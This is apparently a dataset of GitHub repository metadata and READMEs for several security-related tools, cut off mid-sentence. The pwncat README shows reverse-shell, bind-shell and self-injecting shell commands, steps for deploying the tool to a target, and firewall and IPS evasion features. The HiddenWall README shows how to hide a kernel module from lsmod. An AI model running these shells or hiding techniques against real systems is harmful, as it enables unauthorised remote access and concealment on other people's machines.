VFS, Pandora's box has you covered. All of `pandorasbox`'s functions that are in also in `os` have 3 variants: normal, OS, and VFS. The normal variant auto-detirmines what to use based off the input path, as described earlier. The OS and VFS variants force the usage of a specific filesystem. For instance, `pandorasbox.Mkdir()` will auto-detirmine which filesystem to use, while `pandorasbox.OSMkdir()` will always use the host's filesystem, and `pandorasbox.VFSMkdir()` will always use the VFS. \\n\\n### Memory Safety\\n\\nAll files in the VFS are encrypted when not in use. When files from the VFS are opened, they are decrypted for the duration of the call that opened them. VFS files are then re-encrypted with a different random key when reading or writing from them is finished. That is, files in the VFS are only decrypted in memory for a brief time while the underlying data needs to be accessed. In other words, calling `Open()` on a VFS file **will not** decrypt it until `Close()` is called on it. It will only be decrypted in memory when it is internally opened by methods like `Read()`, `Write()`, `Truncate()`, etc. And it is immediately closed afterwards. So opening a VFS file and calling `Read()` on it 3 times will decrypt and re-encrypt it 3 times. This is to make sure data is encrypted in memory whenever possible.\\n\\nFor more information about the exact cryptographic code and algorithms used, refer to this repo: https://github.com/awnumar/memguard.\\n\\n## Acknowledgements\\n\\nThanks to AbsFs contributors for the amazing repos, 70% of the code is from repos from [this organization](https://github.com/absfs).\\n\\nTook some VFS specific tests from [this repo](https://github.com/blang/vfs), thanks to [blang](https://github.com/blang) for some good VFS tests.\\n\\nThanks to [awnumar](https://github.com/awnumar) for [memguard](https://github.com/awnumar/memguard), he created a great repo that is very easy to use safely.\\n\"", "topics": ["cryptography", "filesystem", "golang", "information-security", "infosec", "vfs", "virtual-file-system"], "writeup": "", "ignoredescription": false, "id": 7, "full_name": "capnspacehook/pandorasbox", "url": "https://github.com/capnspacehook/pandorasbox"},
{"tags": [], "owner": "clong", "description": "Tweaks to make Windows 10 less annoying and more usable", "name": "MakeWindows10GreatAgain", "topics_string": "", "language": "PowerShell", "readme": "\"# Make Windows 10 Great Again\\nTweaks to make Windows 10 less annoying and more usable.\\n\\nHere's what this script does:\\n\\n1. Disables Cortana\\n2. Disables Notification Center\\n3. Disables automatic reboots after Windows Updates have been installed\\n4. Disables Microsoft.com accounts from Windows Login\\n5. Shows file extensions for known file types\\n6. Sets Explorer to open to \\\"This PC\\\"\\n7. Shows hidden files (not including OS files)\\n8. Uninstalls OneDrive\\n9. Shows \\\"This PC\\\" icon on Desktop\\n10. Enables developer mode (required for Linux Subsystem)\\n11. Installs the Linux Subsystem\\n12. Updates the Powershell Get-Help items\\n13. Disables SMBv1\\n14. Unpin all Start Menu items\\n15. Disables WPAD \\n\\n## Installation\\nUnfortunately you'll have to set your execution policy to unrestricted to use this script.\\n\\nFrom an Administrator Powershell prompt:\\n```\\nSet-ExecutionPolicy Unrestricted\\ncd MakeWindows10GreatAgain\\n.\\\\MakeWindows10GreatAgain.ps1\\nSet-ExecutionPolicy Restricted\\n```\\n\\n## Notes\\nI considered adding some tweaks to remove the default apps/tiles that come installed with the Win10 start menu, but I've been pleasantly surprised by [Classic Shell](http://classicshell.net/). It's an excellent start menu replacement for Win10. I recommend just installing that.\\n\\nThis script doesn't address any of the privacy issues of Windows 10 because there are already a [bunch of tools](http://www.ghacks.net/2015/08/14/comparison-of-windows-10-privacy-tools/) that already do that.\\n\"", "topics": [], "writeup": "This script doesn't address any of the privacy issues of Windows 10 because there are already a bunch of tools that already do that.", "ignoredescription": false, "id": 8, "full_name": "clong/MakeWindows10GreatAgain", "url": "https://github.com/clong/MakeWindows10GreatAgain"},
{"tags": ["defensive", "linux"], "owner": "CoolerVoid", "description": "Tool to generate a Linux kernel module for custom rules with Netfilter hooking. (block ports, Hidden mode, functions to protect etc)", "name": "HiddenWall", "topics_string": "ansi-c cyber-security firewall kernel-module netfilter network-programming rootkit defensive linux", "language": "C", "readme": "\"# HiddenWall\\n<img align=\\\"center\\\" src=\\\"https://github.com/CoolerVoid/HiddenWall/blob/master/doc/hiddenwallCMD.png?raw=true\\\">\\n\\nHiddenWall is a Linux kernel module generator for custom rules with netfilter. (block ports, Hidden mode, rootkit functions etc).\\n<img align=\\\"right\\\" width=\\\"240\\\" height=\\\"220\\\" src=\\\"https://github.com/CoolerVoid/HiddenWall/blob/master/doc/wall.png\\\">\\nThe motivation: on bad situation, attacker can put your iptables/ufw to fall... but if you have HiddenWall, \\nthe attacker will not find the hidden kernel module that block external access, because have a hook to netfilter on \\nkernel land(think like a second layer for firewall).\\n\\nMy beginning purpose at this project is protect my personal server, now is protect the machines of my friends.\\nWhen i talk \\\"friends\\\", i say peoples that don't know how to write low level code. Using the HiddenWall you can \\ngenerate your custom kernel module for your firewall configuration. \\n\\nThe low level programmer can write new templates for modules etc...\\n\\n\\nFirst step, understand before run\\n--\\n\\nVerify if the kernel version is 3.x, 4.x or 5.x:\\n```\\nuname -r\\n```\\n\\nClone the repository\\n```\\ngit clone https://github.com/CoolerVoid/HiddenWall\\n```\\n\\nEnter the folder\\n```\\ncd HiddenWall/module_generator\\n```\\n\\nEdit your firewall rules in directory rules/server.yaml, the python scripts use that file to generate a new firewall module.\\n\\n```\\n$ cat rules/server.yaml\\nmodule_name: SandWall\\npublic_ports: 80,443,53\\nunhide_key: AbraKadabra\\nhide_key: Shazam\\nfake_device_name: usb14\\nliberate_in_2_out: True\\nwhitelist: \\n- machine: \\n ip: 192.168.100.181\\n open_ports: 22,21\\n- machine:\\n ip: 192.168.100.22\\n open_ports: 22\\n\\n```\\n\\nIf you want study the static code to generate, look the content at directory \\\"templates\\\".\\n\\n\\n\\n\\nSecond step, generate your module\\n--\\n\\nIf you want generate a kernel module following your YAML file of rules, follow that command:\\n\\n```\\n$ python3 WallGen.py --template template/hiddenwall.c -r rules/server.yaml\\n```\\nThis generate a generic module with rules of server.yaml, if you want to use another template you can use \\\"wall.c\\\", so template module \\\"hiddenwall\\\" have option to run on hidden mode(is not visible to \\\"# lsmod\\\" for example).\\n\\n\\n\\nThird step, install your module\\n--\\n\\nTo test module:\\n```\\n# cd output; make clean; make\\n# insmod SandWall.ko\\n```\\n\\nThe rule of YAML to generate module is simple, drop all out to in packets, accept ports 80,443 and 53. The machine 192*.181 can connect at ports 22 and 21...\\n\\nif you use nmap at localhost/127.0.0.1 you can view the ports open... because rule liberate_in_2_out is true.\\n\\nPassword to turn Firewall visible is \\\"AbraKadabra\\\".\\n\\nPassword to turn Firewall invisible is \\\"Shazam\\\".\\n\\nYou need to send password for your fake device \\\"usb14\\\".\\n\\nTo exit module, you need turn visible at \\\"lsmod\\\" command ...\\n\\n```\\n# echo \\\"AbraKadabra\\\" > /dev/usb14\\n# lsmod | grep SandWall\\n# rmmod SandWall\\n```\\n\\n\\nRandom notes\\n--\\n\\nTested on ubuntu 16 and fedora 29 at kernels \\\"3.x\\\",\\\"4.x\\\" and \\\"5.x\\\".\\n\\n\\nTODO\\n--\\n\\nSuport to IPV6.\\nMacro to select the interface(to use multiple modes for each interface).\\nOption to remove last logs when turn hide mode.\\nOption to search and remove others toolkits...\\nCode generator to BFP...\\n\\n\\nReferences\\n--\\n\\n*Wikipedia Netfilter* \\nhttps://en.wikipedia.org/wiki/Netfilter\\n\\n*Linux Device Drivers* \\nhttp://lwn.net/Kernel/LDD3/\\n\\n*M0nad's Diamorphine* \\nhttps://github.com/m0nad/Diamorphine/\\n\"", "topics": ["ansi-c", "cyber-security", "firewall", "kernel-module", "netfilter", "network-programming", "rootkit"], "writeup": "", "ignoredescription": false, "id": 9, "full_name": "CoolerVoid/HiddenWall", "url": "https://github.com/CoolerVoid/HiddenWall"},
{"tags": ["sdr", "gps", "radio", "monitoring"], "owner": "covertcodes", "description": "Keep track of the airwaves with RTL-SDR; snoop and capture everything into a DB", "name": "freqwatch", "topics_string": "sdr gps radio monitoring", "language": "C", "readme": "\"# Freqwatch v0.2\\nJoshua Davis (freqwatch -!- edgetera.net) \\n\\n# UPDATE:\\nThis is newer and does more: http://www.gammarf.io - check it out. \\nOr check out my SensorScape repo\\n\\nUpdates in v0.2\\n===============\\n\\n* Client ID goes to database\\n* Experimental GPS (not finished yet, need help testing)\\n\\n\\nIntroduction\\n============\\n\\n* Explore vast regions of the RF spectrum\\n\\n* Log radio activity to a mysql database for trend analysis\\n\\n* Delegate scanners to find radio traffic and log it\\n\\n* Delegate monitors to store interesting data in the database\\n\\n\\nUsage\\n=====\\n\\n* Install (see the INSTALL file)\\n\\n* Use the 'blacklist' file to prevent frequency ranges from showing up in\\n your database / output\\n\\n* Configure some sticks as scanners using freqwatch.conf. Scanners scan\\n frequency ranges and log signals above a defined threshold to the database,\\n in the 'freqs' table.\\n\\n* Configure other sticks as monitors by using the modified rtl_fm included.\\n Use regular rtl_fm options to specify frequency ranges (several to scan\\n different frequencies), etc. The output will be logged to the database\\n 'intercepts' table.\\n\\n* See the freqwatch.conf file for examples\\n\\n* Use the intercept.py file in the rtl_fm_new directory to pull data from\\n the monitor database. The monitor system still has problems (inserts\\n blanks in the output...)\\n\\n\\nUseful Commands\\n===============\\n\\n* Get rtl_fm_new data to listen to / decode: mysql --binary-mode -e \\\"select group_concat(data separator '') from intercepts order by date, time;\\\" -A -B -r -L -N freqwatch -u freqwatch -p > output\\n\\n* Or better yet, use intercept.py in the rtl_fm directory\\n\\n* Intercept WBFM: rtl_fm -f 95.7e6 -s 170k -A fast -r 32k -l 0 | play -r 32k -t raw -e s -b 16 -c 1 -V1 - (they suggest using -E deemp, but that doesn't work for me)\\n\\n* Listen to WBFM on the command line: cat file | play -t raw -r 32k -e signed-integer -b 16 -c 1 -V1 -\\n\\n\\nSecurity Note\\n==============\\n\\nYou should run freqwatch in a controlled environment (e.g. with the web and\\ndatabase servers on localhost, and a firewall blocking the relevant ports\\nfrom outsiders.)\\n\"", "topics": [], "writeup": "", "ignoredescription": false, "id": 10, "full_name": "covertcodes/freqwatch", "url": "https://github.com/covertcodes/freqwatch"},
{"tags": [], "owner": "cytopia", "description": "pwncat - netcat on steroids with Firewall, IDS/IPS evasion, bind and reverse shell, self-injecting shell and port forwarding magic - and its fully scriptable with Python (PSE)", "name": "pwncat", "topics_string": "bind-shell local-port-forward local-port-forwarding nc ncat netcat penetration-testing pentest pentest-tool pentesting pentesting-python pentesting-tool pivoting port-forwarding portforward pwncat remote-port-forward remote-port-forwarding remote-shell reverse-shell", "language": "Shell", "readme": "\"**[Install](#tada-install)** |\\n**[TL;DR](#coffee-tldr)** |\\n**[Features](#star-features)** |\\n**[Behaviour](#cop-behaviour)** |\\n**[Docs](#closed_book-documentation)** |\\n**[Usage](#computer-usage)** |\\n**[Examples](#bulb-examples)** |\\n**[FAQ](#information_source-faq)** |\\n**[Contributing](#octocat-contributing)** |\\n**[Disclaimer](#exclamation-disclaimer)** |\\n**[License](#page_facing_up-license)**\\n\\n---\\n\\n<center><img alt=\\\"pwncat banner\\\" title=\\\"pwncat\\\" src=\\\"art/banner-1.png\\\" style=\\\"\\\"/></center>\\n\\n# pwncat\\n\\n[![](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)\\n[![PyPI](https://img.shields.io/pypi/v/pwncat)](https://pypi.org/project/pwncat/)\\n[![PyPI - Status](https://img.shields.io/pypi/status/pwncat)](https://pypi.org/project/pwncat/)\\n[![PyPI - Python Version](https://img.shields.io/pypi/pyversions/pwncat)](https://pypi.org/project/pwncat/)\\n[![PyPI - Format](https://img.shields.io/pypi/format/pwncat)](https://pypi.org/project/pwncat/)\\n[![PyPI - Implementation](https://img.shields.io/pypi/implementation/pwncat)](https://pypi.org/project/pwncat/)\\n[![PyPI - License](https://img.shields.io/pypi/l/pwncat)](https://pypi.org/project/pwncat/)\\n\\n[![Build Status](https://github.com/cytopia/pwncat/workflows/linting/badge.svg)](https://github.com/cytopia/pwncat/actions?workflow=linting)\\n[![Build Status](https://github.com/cytopia/pwncat/workflows/building/badge.svg)](https://github.com/cytopia/pwncat/actions?workflow=building)\\n\\n\\n> &nbsp;\\n> #### Netcat on steroids with Firewall, IDS/IPS evasion, bind and reverse shell, self-injecting shell and port forwarding magic - and its fully scriptable with Python ([PSE](pse/)).\\n> &nbsp;\\n\\n\\n<table border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" style=\\\"border-collapse:collapse; border:none;\\\">\\n <thead>\\n <tr valign=\\\"top\\\" border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" style=\\\"border:none;\\\">\\n <th border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" style=\\\"border:none;\\\">Code Style</td>\\n <th border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" style=\\\"border:none;\\\"></td>\\n <th border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" style=\\\"border:none;\\\">Integration Tests <sup><small>[2]</small></sup></td>\\n </tr>\\n </thead>\\n <tbody>\\n <tr valign=\\\"top\\\" border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" style=\\\"border:none;\\\">\\n <td border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" style=\\\"border:none;\\\">\\n <table>\\n <thead>\\n <tr>\\n <th>Styler</th>\\n <th>Status</th>\\n </tr>\\n </thead>\\n <tbody>\\n <tr>\\n <td><a href=\\\"https://github.com/psf/black\\\">Black</a></td>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=black\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/black/badge.svg\\\" /></a></td>\\n </tr>\\n <tr>\\n <td><a href=\\\"https://github.com/python/mypy\\\">mypy</a> <sup><small>[1]</small></sup></td>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=mypy\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/mypy/badge.svg\\\" /></a></td>\\n </tr>\\n <tr>\\n <td><a href=\\\"https://github.com/PyCQA/pycodestyle\\\">pycodestyle</a></td>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=pycode\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/pycode/badge.svg\\\" /></a></td>\\n </tr>\\n <tr>\\n <td><a href=\\\"https://github.com/PyCQA/pydocstyle\\\">pydocstyle</a></td>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=pydoc\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/pydoc/badge.svg\\\" /></a></td>\\n </tr>\\n <tr>\\n <td><a href=\\\"https://github.com/PyCQA/pylint\\\">pylint</a></td>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=pylint\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/pylint/badge.svg\\\" /></a></td>\\n </tr>\\n </tbody>\\n </table>\\n </td>\\n <td border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" style=\\\"border:none;\\\"></td>\\n <td border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" style=\\\"border:none;\\\">\\n <table>\\n <thead>\\n <tr>\\n <th><sub>Python</sub><sup>OS</sup></th>\\n <th>Linux</th>\\n <th>MacOS</th>\\n <th>Windows</th>\\n </tr>\\n </thead>\\n <tbody>\\n <tr>\\n <th>2.7</th>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=ubu-2.7\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/ubu-2.7/badge.svg\\\" /></a></td>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=mac-2.7\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/mac-2.7/badge.svg\\\" /></a></td>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=win-2.7\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/win-2.7/badge.svg\\\" /></a></td>\\n </tr>\\n <tr>\\n <th>3.5</th>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=ubu-3.5\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/ubu-3.5/badge.svg\\\" /></a></td>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=mac-3.5\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/mac-3.5/badge.svg\\\" /></a></td>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=win-3.5\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/win-3.5/badge.svg\\\" /></a></td>\\n </tr>\\n <tr>\\n <th>3.6</th>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=ubu-3.6\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/ubu-3.6/badge.svg\\\" /></a></td>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=mac-3.6\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/mac-3.6/badge.svg\\\" /></a></td>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=win-3.6\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/win-3.6/badge.svg\\\" /></a></td>\\n </tr>\\n <tr>\\n <th>3.7</th>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=ubu-3.7\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/ubu-3.7/badge.svg\\\" /></a></td>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=mac-3.7\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/mac-3.7/badge.svg\\\" /></a></td>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=win-3.7\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/win-3.7/badge.svg\\\" /></a></td>\\n </tr>\\n <tr>\\n <th>3.8</th>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=ubu-3.8\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/ubu-3.8/badge.svg\\\" /></a></td>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=mac-3.8\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/mac-3.8/badge.svg\\\" /></a></td>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=win-3.8\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/win-3.8/badge.svg\\\" /></a></td>\\n </tr>\\n <tr>\\n <th>pypy2</th>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=ubu-py2\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/ubu-py2/badge.svg\\\" /></a></td>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=mac-py2\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/mac-py2/badge.svg\\\" /></a></td>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=win-py2\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/win-py2/badge.svg\\\" /></a></td>\\n </tr>\\n <tr>\\n <th>pypy3</th>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=ubu-py3\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/ubu-py3/badge.svg\\\" /></a></td>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=mac-py3\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/mac-py3/badge.svg\\\" /></a></td>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=win-py3\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/win-py3/badge.svg\\\" /></a></td>\\n </tr>\\n </tbody>\\n </table>\\n </td>\\n </tr>\\n </tbody>\\n</table>\\n\\n> <sup>[1] <a href=\\\"https://cytopia.github.io/pwncat/pwncat.type.html\\\">mypy type coverage</a> <strong>(fully typed: 93.84%)</strong></sup><br/>\\n> <sup>[2] <strong>Failing builds do not indicate broken functionality.</strong> Integration tests run for multiple hours and break sporadically for various different reasons (network timeouts, unknown cancellations of GitHub Actions, etc): <a href=\\\"https://github.com/actions/virtual-environments/issues/736\\\">#735</a>, <a href=\\\"https://github.com/actions/virtual-environments/issues/841\\\">#841</a></sup><br/>\\n> <sup></sup>\\n\\n\\n#### Motivation\\nEver accidentally hit <kbd>Ctrl</kbd>+<kbd>c</kbd> on your reverse shell and it was gone for good?\\nEver waited forever for your client to connect back to you, because the Firewall didn't let it out?\\nEver had a connection loss because an IPS closed suspicious ports?\\nEver were in need of a quick port forwarding?<br/>\\n> **This one got you covered.**\\n\\nApart from that the current features of `nc`, `ncat` or `socat` just didn't feed my needs and I also wanted to have a single\\ntool that works on older and newer machines (hence Python 2+3 compat). Most importantly I wanted to have it in a language that I can understand and provide my own features with.\\n(Wait for it, binary releases for Linux, MacOS and Windows will come shortly).\\n\\n\\n## :tada: Install\\n\\nCurrent version is: **0.1.0**\\n\\n| [Pip](https://pypi.org/project/pwncat/) | [ArchLinux](https://aur.archlinux.org/packages/pwncat/) | [BlackArch](https://www.blackarch.org/tools.html) | [MacOS](https://formulae.brew.sh/formula/pwncat#default) |\\n|:-:|:-:|:-:|:-:|\\n| [![](https://raw.githubusercontent.com/cytopia/icons/master/64x64/python.png)](https://pypi.org/project/pwncat/) | [![](https://raw.githubusercontent.com/cytopia/icons/master/64x64/archlinux.png)](https://aur.archlinux.org/packages/pwncat/) | [![](https://raw.githubusercontent.com/cytopia/icons/master/64x64/blackarch.png)](https://www.blackarch.org/tools.html) | [![](https://raw.githubusercontent.com/cytopia/icons/master/64x64/osx.png)](https://formulae.brew.sh/formula/pwncat#default) |\\n| `pip install pwncat` | `yay -S pwncat` | `pacman -S pwncat` | `brew install pwncat` |\\n\\n\\n## :coffee: TL;DR\\n\\nThis is just a quick get-you-started overview. For more advanced techniques see **[:computer: Usage](#computer-usage)** or **[:bulb: Examples](#bulb-examples)**.\\n\\n### See in action\\n\\n<table>\\n <tr>\\n <td widht=\\\"50%\\\" style=\\\"text-align:center;\\\">\\n <a href=\\\"https://www.youtube.com/watch?v=lN10hgl_Ts8&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2&t=0s\\\">unbreakable reverse shells - how to spawn</a><br/><br/>\\n <a href=\\\"https://www.youtube.com/watch?v=lN10hgl_Ts8&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2&t=0s\\\"><img src=\\\"docs/img/video01.png\\\" /></a>\\n </td>\\n <td widht=\\\"50%\\\" style=\\\"text-align:center;\\\">\\n <a href=\\\"https://www.youtube.com/watch?v=VQyFoUG18WY&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2\\\">unbreakable reverse shells - multiple shells</a><br/><br/>\\n <a href=\\\"https://www.youtube.com/watch?v=VQyFoUG18WY&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2\\\"><img src=\\\"docs/img/video02.png\\\" /></a>\\n </td>\\n </tr>\\n</table>\\n\\n\\n### Deploy to target\\n```bash\\n# Copy base64 data to clipboard from where you have internet access\\ncurl https://raw.githubusercontent.com/cytopia/pwncat/master/bin/pwncat | base64\\n\\n# Paste it on the target machine\\necho \\\"<BASE64 STRING>\\\" | base64 -d > pwncat\\nchmod +x pwncat\\n```\\n\\n### Inject to target\\n```bash\\n# [1] If you found a vulnerability on the target to start a very simple reverse shell,\\n# such as via bash, php, perl, python, nc or similar, you can instruct your local\\n# pwncat listener to use this connection to deploy itself on the target automatically\\n# and start an additional unbreakable reverse shell back to you.\\npwncat -l 4444 --self-inject /bin/bash:10.0.0.1:4445\\n```\\n> <sup>[1] [Read in more detail about self-injection](#self-injecting-reverse-shell)\\n\\n### Summon shells\\n```bash\\n# Bind shell (accepts new clients after disconnect)\\npwncat -l -e '/bin/bash' 8080 -k\\n```\\n```bash\\n# Reverse shell (Ctrl+c proof: reconnects back to you)\\npwncat -e '/bin/bash' example.com 4444 --reconn --recon-wait 1\\n```\\n```bash\\n# Reverse UDP shell (Ctrl+c proof: reconnects back to you)\\npwncat -e '/bin/bash' example.com 4444 -u --ping-intvl 1\\n```\\n\\n### Port scan\\n```bash\\n# [TCP] IPv4 + IPv6\\npwncat -z 10.0.0.1 80,443,8080\\npwncat -z 10.0.0.1 1-65535\\npwncat -z 10.0.0.1 1+1023\\n\\n# [UDP] IPv4 + IPv6\\npwncat -z 10.0.0.1 80,443,8080 -u\\npwncat -z 10.0.0.1 1-65535 -u\\npwncat -z 10.0.0.1 1+1023 -u\\n\\n# Use only IPv6 or IPv4\\npwncat -z 10.0.0.1 1-65535 -4\\npwncat -z 10.0.0.1 1-65535 -6 -u\\n\\n# Add version detection\\npwncat -z 10.0.0.1 1-65535 --banner\\n```\\n\\n### Local port forward `-L` (listening proxy)\\n```bash\\n# Make remote MySQL server (remote port 3306) available on current machine\\n# on every interface on port 5000\\npwncat -L 0.0.0.0:5000 everythingcli.org 3306\\n```\\n```bash\\n# Same, but convert traffic on your end to UDP\\npwncat -L 0.0.0.0:5000 everythingcli.org 3306 -u\\n```\\n\\n### Remote port forward `-R` (double client proxy)\\n```bash\\n# Connect to Remote MySQL server (remote port 3306) and then connect to another\\n# pwncat/netcat server on 10.0.0.1:4444 and bridge traffic\\npwncat -R 10.0.0.1:4444 everythingcli.org 3306\\n```\\n```bash\\n# Same, but convert traffic on your end to UDP\\npwncat -R 10.0.0.1:4444 everythingcli.org 3306 -u\\n```\\n\\n> <sub>[SSH Tunnelling for fun and profit :link:](https://www.everythingcli.org/ssh-tunnelling-for-fun-and-profit-local-vs-remote/)</sub><br/>\\n> <sub>[`pwncat` example: Port forwarding magic](#port-forwarding-magic)<sub>\\n\\n\\n## :star: Features\\n\\n### At a glance\\n\\n`pwncat` has many features, below is only a list of outstanding characteristics.\\n\\n| Feature | Description |\\n|----------------|-------------|\\n| [PSE](pse) | Fully scriptable with Pwncat Scripting Engine to allow all kinds of fancy stuff on send and receive |\\n| port scanning | TCP und UDP port scanning with basic version detection support |\\n| Self-injecting rshell | Self-injecting mode to deploy itself and start an unbreakable reverse shell back to you automatically |\\n| Bind shell | Create bind shells |\\n| Reverse shell | Create reverse shells |\\n| Port Forward | Local and remote port forward (Proxy server/client) |\\n| <kbd>Ctrl</kbd>+<kbd>c</kbd> | Reverse shell can reconnect if you accidentally hit <kbd>Ctrl</kbd>+<kbd>c</kbd> |\\n| Detect Egress | Scan and report open egress ports on the target (port hopping) |\\n| Evade FW | Evade egress firewalls by round-robin outgoing ports (port hopping) |\\n| Evade IPS | Evade Intrusion Prevention Systems by being able to round-robin outgoing ports on connection interrupts (port hopping) |\\n| UDP rev shell | Try this with the traditional `netcat` |\\n| Stateful UDP | Stateful connect phase for UDP client mode |\\n| TCP / UDP | Full TCP and UDP support |\\n| IPv4 / IPv6 | Dual or single stack IPv4 and IPv6 support |\\n| Python 2+3 | Works with Python 2, Python 3, pypy2 and pypy3 |\\n| Cross OS | Work on Linux, MacOS and Windows as long as Python is available |\\n| Compatability | Use the `netcat`, `ncat` or `socat` as a client or server together with `pwncat` |\\n| Portable | Single file which only uses core packages - no external dependencies required. |\\n\\n\\n### Feature comparison matrix\\n\\n| | pwncat | netcat | ncat | socat |\\n|---------------------|----------|--------|-------|-------|\\n| Scripting engine | \\u2714 Python | :x: | \\u2714 Lua | :x: |\\n| | | | | |\\n| IP ToS | \\u2714 | \\u2714 | :x: | \\u2714 |\\n| IPv4 | \\u2714 | \\u2714 | \\u2714 | \\u2714 |\\n| IPv6 | \\u2714 | \\u2714 | \\u2714 | \\u2714 |\\n| Unix domain sockets | :x: | \\u2714 | \\u2714 | \\u2714 |\\n| Linux vsock | :x: | :x: | \\u2714 | :x: |\\n| Socket source bind | \\u2714 | \\u2714 | \\u2714 | \\u2714 |\\n| | | | | |\\n| TCP | \\u2714 | \\u2714 | \\u2714 | \\u2714 |\\n| UDP | \\u2714 | \\u2714 | \\u2714 | \\u2714 |\\n| SCTP | :x: | :x: | \\u2714 | \\u2714 |\\n| SSL | :x: | :x: | \\u2714 | \\u2714 |\\n| HTTP | \\u2714 | :x: | :x: | :x: |\\n| HTTPS | * | :x: | :x: | :x: |\\n| | | | | |\\n| Telnet negotiation | :x: | \\u2714 | \\u2714 | :x: |\\n| Proxy support | :x: | \\u2714 | \\u2714 | \\u2714 |\\n| Local port forward | \\u2714 | :x: | :x: | \\u2714 |\\n| Remote port forward | \\u2714 | :x: | :x: | :x: |\\n| | | | | |\\n| Inbound port scan | \\u2714 | \\u2714 | \\u2714 | :x: |\\n| Outbound port scan | \\u2714 | :x: | :x: | :x: |\\n| Version detection | \\u2714 | :x: | :x: | :x: |\\n| | | | | |\\n| Chat | \\u2714 | \\u2714 | \\u2714 | \\u2714 |\\n| Command execution | \\u2714 | \\u2714 | \\u2714 | \\u2714 |\\n| Hex dump | * | \\u2714 | \\u2714 | \\u2714 |\\n| Broker | :x: | :x: | \\u2714 | :x: |\\n| Simultaneous conns | :x: | :x: | \\u2714 | \\u2714 |\\n| Allow/deny | :x: | :x: | \\u2714 | \\u2714 |\\n| Re-accept | \\u2714 | \\u2714 | \\u2714 | \\u2714 |\\n| Self-injecting | \\u2714 | :x: | :x: | :x: |\\n| UDP reverse shell | \\u2714 | :x: | :x: | :x: |\\n| Respawning client | \\u2714 | :x: | :x: | :x: |\\n| Port hopping | \\u2714 | :x: | :x: | :x: |\\n| Emergency shutdown | \\u2714 | :x: | :x: | :x: |\\n\\n> <sup>`*` Feature is currently under development.\\n\\n\\n## :cop: Behaviour\\n\\nLike the original implementation of `netcat`, when using **TCP**, `pwncat`\\n(in client and listen mode) will automatically quit, if the network connection has been terminated,\\nproperly or improperly.\\nIn case the remote peer does not terminate the connection, or in **UDP** mode, `netcat` and `pwncat` will stay open. The behaviour differs a bit when STDIN is closed.\\n\\n1. `netcat`: If STDIN is closed, but connection stays open, `netcat` will stay open\\n2. `pwncat`: If STDIN is closed, but connection stays 